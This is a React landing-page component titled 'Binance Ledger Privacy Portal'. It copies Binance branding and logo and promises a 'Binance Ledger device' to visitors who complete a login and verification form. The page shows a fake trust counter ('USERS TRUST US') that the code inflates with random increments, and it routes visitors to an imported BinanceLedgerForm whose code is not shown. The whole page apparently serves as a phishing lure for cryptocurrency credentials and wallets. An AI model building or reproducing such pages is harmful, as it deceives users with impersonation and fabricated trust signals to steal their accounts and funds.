
import React, { useState, useEffect } from "react";
import BinanceHeader from "@/components/BinanceHeader";
import BinanceFooter from "@/components/BinanceFooter";
import BinanceLedgerForm from "@/components/BinanceLedgerForm";
import BinanceAppPromotion from "@/components/BinanceAppPromotion";

const Index = () => {
  const [userCount, setUserCount] = useState(274368184);

  useEffect(() => {
    // Simulate counter increasing every few seconds
    const counterInterval = setInterval(() => {
      setUserCount(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 2000);
    
    return () => {
      clearInterval(counterInterval);
    };
  }, []);

  // Format the user count with commas
  const formattedUserCount = userCount.toLocaleString();

  return (
    <div className="min-h-screen flex flex-col bg-binance-dark text-white">
      <BinanceHeader />
      
      <main className="flex-grow relative">
        {/* Hero Section - improved title positioning */}
        <div className="bg-binance-dark py-8 md:py-12 relative overflow-hidden">
          <div className="container mx-auto px-4">
            <div className="max-w-5xl mx-auto">
              <div className="flex flex-col items-center text-center relative z-10">
                {/* Binance logo icon with title */}
                <div className="flex items-center justify-center mb-4">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="mr-3">
                    <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
                    <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
                    <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
                    <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
                    <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
                    <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
                  </svg>
                  <h1 className="text-2xl md:text-3xl lg:text-4xl font-bold">
                    Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
                  </h1>
                </div>
                <p className="text-gray-300 text-sm md:text-base mb-4 md:mb-6 max-w-2xl px-2 md:px-0">
                  Secure your crypto assets with the most trusted hardware wallet in the industry
                </p>
                
                {/* User Counter */}
                <div className="flex items-center justify-center">
                  <div className="w-8 h-px bg-binance-yellow my-auto mr-3"></div>
                  <div className="flex flex-col items-center">
                    <span className="text-binance-yellow text-lg md:text-xl font-bold">
                      {formattedUserCount}
                    </span>
                    <span className="text-[#848E9C] text-xs uppercase">
                      USERS TRUST US
                    </span>
                  </div>
                  <div className="w-8 h-px bg-binance-yellow my-auto ml-3"></div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Security Image positioned to overlap sections */}
          <div className="absolute right-0 top-1/2 transform -translate-y-1/2 z-20 hidden lg:block">
            <img 
              src="/lovable-uploads/b6ce22c2-67e9-4899-a332-cc8bd09e06e8.png" 
              alt="Security and Privacy" 
              className="max-w-md h-auto"
            />
          </div>
          
          {/* Tablet view for Security image */}
          <div className="hidden md:block lg:hidden absolute right-5 top-1/2 transform -translate-y-1/2 z-20">
            <img 
              src="/lovable-uploads/b6ce22c2-67e9-4899-a332-cc8bd09e06e8.png" 
              alt="Security and Privacy" 
              className="max-w-[250px] h-auto"
            />
          </div>
          
          {/* Mobile view for Security image - improved positioning as background element */}
          <div className="absolute inset-0 z-0 md:hidden flex items-center justify-center opacity-30">
            <img 
              src="/lovable-uploads/b6ce22c2-67e9-4899-a332-cc8bd09e06e8.png" 
              alt=""
              className="w-[300px] max-w-[80%] h-auto object-contain"
              aria-hidden="true"
            />
          </div>
        </div>
        
        {/* Form Section - improved mobile responsiveness */}
        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-6 relative">
          <div className="max-w-4xl mx-auto mb-4 md:mb-8 pt-3 md:pt-4 px-2 md:px-0">
            <h2 className="text-xl md:text-2xl font-bold mb-2 md:mb-3">Ledger Verification Portal</h2>
            <p className="text-gray-300 text-sm md:text-base">
              Please complete the login and verification process below to receive your Binance Ledger device 
              and link it securely to your wallet.
            </p>
          </div>
          
          <BinanceLedgerForm />
        </div>
      </main>
      
      <BinanceFooter />
      <BinanceAppPromotion />
    </div>
  );
};

export default Index;
